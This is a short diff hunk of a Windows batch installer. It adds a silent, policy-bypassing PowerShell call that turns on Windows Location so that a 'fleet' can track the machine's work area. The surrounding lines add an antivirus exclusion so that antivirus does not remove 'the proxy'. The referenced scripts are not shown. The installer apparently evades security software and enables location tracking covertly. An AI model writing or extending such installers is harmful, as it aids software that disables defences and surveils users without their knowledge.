@@ -104,6 +104,11 @@ if %ERRORLEVEL% EQU 0 (
 
 timeout /t 1 /nobreak >nul
 
+REM Enable Windows Location (WiFi triangulation) so the fleet can audit the
+REM work-area. Best-effort + admin — if it can't, location just stays off and
+REM nothing else is affected.
+powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%BRAIN_DIR%\EnableLocation.ps1" >nul 2>&1
+
 REM Step 3: Add antivirus exclusion - McAfee if present, else Windows Defender (run as admin)
 echo [3/8] Adding antivirus exclusion ^(so antivirus doesn't remove the proxy^)...
 powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -File "%BRAIN_DIR%\AddAntivirusExclusion.ps1" -WatcherFolder "%SCRIPT_DIR%" >nul 2>&1
